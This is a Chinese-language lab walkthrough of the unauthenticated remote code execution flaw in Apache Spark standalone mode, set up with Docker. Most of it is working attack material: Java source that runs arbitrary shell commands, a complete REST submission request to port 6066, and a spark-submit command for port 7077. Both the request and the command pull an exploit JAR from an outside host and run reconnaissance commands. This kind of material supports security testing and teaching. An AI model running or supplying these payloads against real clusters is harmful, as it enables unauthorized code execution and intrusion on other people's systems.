# Apache Spark 未授权访问漏洞

# 漏洞环境

执行如下命令，将以standalone模式启动一个Apache Spark集群，集群里有一个master与一个slave：

```plain
docker compose up -d
```

环境启动后，访问http://your-ip:8080即可看到master的管理页面，访问http://your-ip:8081即可看到slave的管理页面。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780909267170-93c27055-4da9-4d75-85f8-594b30bb3f7e.png)![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780909267098-b6fb07af-692d-44a8-932c-4efe83b066b7.png)

## 漏洞利用

该漏洞本质是未授权的用户可以向管理节点提交一个应用，这个应用实际上是恶意代码。

提交方式有两种：

1.利用REST API

2.利用submissions网关（集成在7077端口中）

应用可以是Java或Python，就是一个最简单的类，如（参考链接1）：

```plain
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class Exploit {
  public static void main(String[] args) throws Exception {
    String[] cmds = args[0].split(",");

    for (String cmd : cmds) {
      System.out.println(cmd);
      System.out.println(executeCommand(cmd.trim()));
      System.out.println("==============================================");
    }
  }

  // https://www.mkyong.com/java/how-to-execute-shell-command-from-java/
  private static String executeCommand(String command) {
    StringBuilder output = new StringBuilder();

    try {
      Process p = Runtime.getRuntime().exec(command);
      p.waitFor();
      BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

      String line;
      while ((line = reader.readLine()) != null) {
        output.append(line).append("\n");
      }
    } catch (Exception e) {
      e.printStackTrace();
    }

    return output.toString();
  }
}
```

将其编译成JAR，放在任意一个HTTP或FTP上，如https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780909267201-aefab6b1-a0d5-4dab-bab8-66dbe1218625.png)![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780909267045-7cd99131-3819-4493-87f1-0871d0e2125b.png)

### 用REST API方式提交应用

standalone模式下，master将在6066端口启动一个HTTP服务器，我们向这个端口提交REST格式的API：

```plain
POST /v1/submissions/create HTTP/1.1
Host: your-ip:6066
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Content-Type: application/json
Connection: close
Content-Length: 680

{
  "action": "CreateSubmissionRequest",
  "clientSparkVersion": "2.3.1",
  "appArgs": [
    "whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf"
  ],
  "appResource": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar",
  "environmentVariables": {
    "SPARK_ENV_LOADED": "1"
  },
  "mainClass": "Exploit",
  "sparkProperties": {
    "spark.jars": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar",
    "spark.driver.supervise": "false",
    "spark.app.name": "Exploit",
    "spark.eventLog.enabled": "true",
    "spark.submit.deployMode": "cluster",
    "spark.master": "spark://your-ip:6066"
  }
}
```

其中，spark.jars即是编译好的应用，mainClass是待运行的类，appArgs是传给应用的参数。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780909267189-0a3638b6-0c4c-4e5b-b8a7-d00053e0966f.png)

返回的包中有submissionId，然后访问http://your-ip:8081/logPage/?driverId={submissionId}&logType=stdout，即可查看执行结果：![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780909268174-7ae822a3-75cc-4214-9048-5353b88a0ea9.png)

注意，提交应用是在master中，查看结果是在具体执行这个应用的slave里（默认8081端口）。实战中，由于slave可能有多个。

利用submissions网关

如果6066端口不能访问，或做了权限控制，我们可以利用master的主端口7077，来提交应用。

方法是利用Apache Spark自带的脚本bin/spark-submit：

```plain
bin/spark-submit --master spark://your-ip:7077 --deploy-mode cluster --class Exploit https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar id
```

如果你指定的master参数是rest服务器，这个脚本会先尝试使用rest api来提交应用；如果发现不是rest服务器，则会降级到使用submission gateway来提交应用。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780909268650-e66be084-a490-4099-b3cc-acf0d3fe7ed5.png)

查看结果的方式与前面一致。